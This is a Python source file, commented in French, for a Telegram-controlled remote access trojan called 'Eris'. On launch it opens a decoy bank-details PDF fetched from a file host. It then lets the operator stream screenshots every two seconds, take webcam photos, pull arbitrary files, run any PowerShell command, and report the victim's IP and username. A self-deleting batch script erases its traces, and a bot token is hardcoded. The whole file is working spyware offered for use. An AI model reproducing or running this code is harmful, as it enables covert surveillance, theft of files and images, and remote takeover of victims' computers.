import pyautogui
import telebot
import requests
import os
import subprocess
import platform
import socket
import threading
import time
from io import BytesIO
import tempfile
import random

# Configuration
alias = "Eris"
telegram_api_key = "7310605601:AAHg65_BDV4cVxgNkVRVARTgvrcNfdsqs6Q"  # Remplacez par votre token Telegram
chat_id = None  # Sera d√©fini lors de la premi√®re interaction
bot = telebot.TeleBot(telegram_api_key)
print("Le bot est en cours d'ex√©cution")

# Variable globale pour contr√¥ler le thread d'autoscreenshot
autoscreenshot_running = False

def get_public_ip():
    """R√©cup√®re l'adresse IP publique"""
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except Exception as e:
        print("Erreur lors de la r√©cup√©ration de l'adresse IP publique:", e)
        return None

def get_system_info():
    """Collecte des informations basiques sur le syst√®me"""
    info = {
        "platform": platform.system(),
        "hostname": socket.gethostname(),
        "username": os.getlogin()
    }
    return info

def create_kill_script():
    """Cr√©e un script pour supprimer le programme et effacer toutes les traces"""
    try:
        script_name = os.path.basename(__file__)
        temp_dir = tempfile.gettempdir()
        kill_script_path = os.path.join(temp_dir, "clean.bat")
        
        with open(kill_script_path, "w") as f:
            f.write("@echo off\n")
            f.write(f"del /f /q \"{os.path.abspath(script_name)}\"\n")  # Supprime le script Python
            f.write(f"del /f /q \"{kill_script_path}\"\n")  # S'auto-supprime
            f.write(f"rmdir /s /q \"{temp_dir}\\sc_*\" 2>nul\n")  # Supprime les captures restantes
            # Ajouter une commande pour se terminer
            f.write("exit\n")
            
        return kill_script_path
    except Exception as e:
        print("Erreur lors de la cr√©ation du script de suppression:", e)
        return None

def take_screenshot():
    """Prend une capture d'√©cran"""
    try:
        # Utiliser un nom de fichier avec timestamp pour √©viter les collisions
        screenshot = pyautogui.screenshot()
        # Cr√©er le fichier dans un r√©pertoire temporaire pour plus de discr√©tion
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"sc_{int(time.time())}_{random.randint(1000, 9999)}.png")
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print("Erreur lors de la capture d'√©cran:", e)
        return None

# Fonction pour g√©rer la commande kill
@bot.message_handler(func=lambda message: message.text == "/kill " + alias)
def handle_kill_command(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    markup.add("Oui", "Non")
    sent = bot.send_message(message.chat.id, "√ätes-vous s√ªr de vouloir arr√™ter ce bot ?üî™üòÖ  Oui/Non", reply_markup=markup)
    bot.register_next_step_handler(sent, handle_kill_confirmation)

def handle_kill_confirmation(message):
    if message.text.lower() in ["oui", "yes"]:
        kill_script_path = create_kill_script()
        if kill_script_path:
            # Nettoyer les captures d'√©cran potentiellement restantes
            temp_dir = tempfile.gettempdir()
            for file in os.listdir(temp_dir):
                if file.startswith("sc_") and file.endswith(".png"):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass
                        
            bot.send_message(message.chat.id, "Adieu mon cher monde üî´ü©∏")
            bot.send_message(message.chat.id, "ü´°")
            bot.stop_polling()
            # Ex√©cuter le script de nettoyage
            subprocess.Popen(["cmd", "/c", kill_script_path], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
        else:
            bot.send_message(message.chat.id, "√âchec de la cr√©ation du script de suppression.")
    elif message.text.lower() in ["non", "no"]:
        bot.send_message(message.chat.id, "Merci üòÆ‚Äçüí®")

# Fonction pour g√©rer l'autoscreenshot
def autoscreenshot_start():
    global autoscreenshot_running
    autoscreenshot_running = True
    
    while autoscreenshot_running:
        # Prendre une capture d'√©cran toutes les 2 secondes
        time.sleep(2)
        
        screenshot_path = take_screenshot()
        if screenshot_path and chat_id:
            with open(screenshot_path, 'rb') as photo:
                bot.send_message(chat_id, "Capture d'√©cran automatique üì∏ü´°")
                bot.send_photo(chat_id, photo)
            # Supprimer imm√©diatement la photo apr√®s envoi
            os.remove(screenshot_path)

def autoscreenshot_stop():
    global autoscreenshot_running
    autoscreenshot_running = False
    if chat_id:
        bot.send_message(chat_id, "Capture d'√©cran automatique arr√™t√©e ‚úãü´°")

# Fonction pour t√©l√©charger et ouvrir le PDF au d√©marrage
def download_and_open_pdf():
    try:
        # T√©l√©charger le PDF
        pdf_url = "https://tmpfiles.org/dl/27201621/rib.pdf"
        response = requests.get(pdf_url)
        if response.status_code == 200:
            # Sauvegarder le PDF dans un r√©pertoire temporaire
            temp_dir = tempfile.gettempdir()
            pdf_path = os.path.join(temp_dir, f"document_{int(time.time())}.pdf")
            
            with open(pdf_path, 'wb') as pdf_file:
                pdf_file.write(response.content)
            
            # Ouvrir le PDF avec l'application par d√©faut du syst√®me
            if platform.system() == 'Windows':
                os.startfile(pdf_path)
            elif platform.system() == 'Darwin':  # macOS
                subprocess.Popen(['open', pdf_path])
            else:  # Linux
                subprocess.Popen(['xdg-open', pdf_path])
                
            print("PDF ouvert avec succ√®s.")
            
            # On laisse le PDF ouvert pour que l'utilisateur puisse le consulter
            # Il sera supprim√© lors du nettoyage g√©n√©ral si kill est appel√©
            return pdf_path
        else:
            print(f"√âchec du t√©l√©chargement du PDF. Code d'√©tat: {response.status_code}")
            return None
    except Exception as e:
        print(f"Erreur lors du t√©l√©chargement et de l'ouverture du PDF: {e}")
        return None

# Fonction pour t√©l√©charger un PDF via une commande
@bot.message_handler(func=lambda message: message.text.startswith("/pdf " + alias + " "))
def handle_pdf_download(message):
    # Extraire l'URL du message
    url = message.text[len("/pdf " + alias + " "):].strip()
    try:
        # T√©l√©charger le PDF
        response = requests.get(url)
        if response.status_code == 200:
            # Sauvegarder le PDF temporairement
            temp_dir = tempfile.gettempdir()
            pdf_path = os.path.join(temp_dir, f"document_{int(time.time())}.pdf")
            
            with open(pdf_path, 'wb') as pdf_file:
                pdf_file.write(response.content)
            
            # Envoyer le PDF au chat
            with open(pdf_path, 'rb') as doc_file:
                bot.send_message(message.chat.id, "Voici votre PDF üìÑü´°")
                bot.send_document(message.chat.id, doc_file)
            
            # Supprimer le fichier temporaire
            os.remove(pdf_path)
            
            # Confirmer le t√©l√©chargement
            bot.send_message(message.chat.id, f"PDF t√©l√©charg√© avec succ√®s ‚úÖ")
        else:
            bot.send_message(message.chat.id, f"√âchec du t√©l√©chargement. Code d'√©tat: {response.status_code}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erreur: {str(e)}")

# Fonction pour prendre une photo de la webcam
def take_webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        ret, frame = cap.read()
        if not ret:
            return None
        
        webcam_path = f"webcam_{int(time.time())}.png"
        cv2.imwrite(webcam_path, frame)
        cap.release()
        return webcam_path
    except Exception as e:
        print(f"Erreur lors de la capture webcam: {e}")
        return None

def take_webcam_photo_confirm(message):
    try:
        webcam_file = take_webcam_photo()
        if webcam_file:
            with open(webcam_file, 'rb') as photo:
                bot.send_message(message.chat.id, f"Votre photo webcam üì∏ü´°")
                bot.send_photo(message.chat.id, photo)
            # Effacer imm√©diatement le fichier
            os.remove(webcam_file)
        else:
            bot.send_message(message.chat.id, f"√âchec de la photo webcam üì∏üòì")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erreur: {e}")
        # En cas d'erreur, v√©rifier si le fichier existe et le supprimer
        if 'webcam_file' in locals() and webcam_file and os.path.exists(webcam_file):
            os.remove(webcam_file)

# Fonction pour ex√©cuter une commande PowerShell
def execute_powershell_command(message):
    markup = telebot.types.ForceReply(selective=True)
    sent = bot.send_message(message.chat.id, "Entrez la commande PowerShell:", reply_markup=markup)
    bot.register_next_step_handler(sent, process_powershell_command)

def process_powershell_command(message):
    command = message.text
    try:
        result = subprocess.check_output(["powershell", "-Command", command], shell=True, stderr=subprocess.STDOUT)
        output = result.decode('utf-8', errors='replace')
        if output:
            bot.send_message(message.chat.id, f"R√©sultat: \n```\n{output}\n```")
        else:
            bot.send_message(message.chat.id, "Commande ex√©cut√©e sans r√©sultat.")
    except subprocess.CalledProcessError as e:
        bot.send_message(message.chat.id, f"Erreur: {e.output.decode('utf-8', errors='replace')}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erreur: {str(e)}")

# Fonction pour g√©rer les messages entrants
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    global chat_id
    chat_id = message.chat.id
    
    if "/sessions password" in message.text:
        public_ip = get_public_ip()
        sys_info = get_system_info()
        if public_ip:
            user_username = sys_info["username"]
            bot.send_message(message.chat.id, f"üë§ {user_username} | üü¢ {public_ip} | ü™™ {alias}")
            
            # D√©marrer automatiquement les captures d'√©cran automatiques
            bot.send_message(message.chat.id, "Capture d'√©cran automatique d√©marr√©e üì∏")
            autoscreenshot_thread = threading.Thread(target=autoscreenshot_start)
            autoscreenshot_thread.daemon = True
            autoscreenshot_thread.start()
            
    elif message.text == "/screenshot " + alias:
        screenshot_file = take_screenshot()
        if screenshot_file:
            with open(screenshot_file, 'rb') as photo:
                bot.send_message(message.chat.id, f"Votre capture d'√©cran üì∏ü´°")
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_file)
        else:
            bot.send_message(message.chat.id, f"√âchec de la capture d'√©cran üì∏üòì")
            
    elif message.text.startswith("/get "+ alias + " "):
        filename = message.text[len("/get " + alias +" "):].strip()
        if os.path.exists(filename):
            with open(filename, "rb") as file:
                bot.send_message(message.chat.id, f"Votre fichier üìÑü´°")
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, f"Le fichier '{filename}' n'existe pas üìÑüòì")
            
    elif message.text == "/webcam " + alias:
        take_webcam_photo_confirm(message)
        
    elif message.text == "/powershell " + alias:
        execute_powershell_command(message)
        
    elif message.text == "/autoscreenshot start " + alias:
        bot.send_message(message.chat.id, "Capture d'√©cran automatique d√©marr√©e üì∏")
        autoscreenshot_thread = threading.Thread(target=autoscreenshot_start)
        autoscreenshot_thread.daemon = True
        autoscreenshot_thread.start()
        
    elif message.text == "/autoscreenshot stop " + alias:
        autoscreenshot_stop()
    
    elif message.text == "/help " + alias:
        help_text = """
Commandes disponibles:
/sessions password - Affiche les informations syst√®me
/screenshot {alias} - Prend une capture d'√©cran
/webcam {alias} - Prend une photo avec la webcam
/get {alias} {chemin} - R√©cup√®re un fichier
/powershell {alias} - Ex√©cute une commande PowerShell
/autoscreenshot start {alias} - D√©marre les captures d'√©cran automatiques
/autoscreenshot stop {alias} - Arr√™te les captures d'√©cran automatiques
/pdf {alias} {url} - T√©l√©charge un PDF depuis une URL
/kill {alias} - Supprime le programme
/help {alias} - Affiche ce message d'aide
"""
        bot.send_message(message.chat.id, help_text)

# D√©marrage du programme
def main():
    # Prend une capture d'√©cran au d√©marrage
    screenshot_file = take_screenshot()
    if screenshot_file and chat_id:
        # Envoyer la capture d'√©cran initiale si chat_id est d√©fini
        try:
            with open(screenshot_file, 'rb') as photo:
                bot.send_message(chat_id, "Capture d'√©cran initiale üì∏ü´°")
                bot.send_photo(chat_id, photo)
        except Exception:
            # Ignorer les erreurs si chat_id n'est pas encore d√©fini
            pass
        finally:
            # Supprimer la capture d'√©cran dans tous les cas
            if os.path.exists(screenshot_file):
                os.remove(screenshot_file)
    
    # T√©l√©charge et ouvre le PDF dans un thread s√©par√©
    pdf_thread = threading.Thread(target=download_and_open_pdf)
    pdf_thread.daemon = True
    pdf_thread.start()
    
    # D√©marre le bot
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Erreur du bot: {e}")

if __name__ == "__main__":
    main()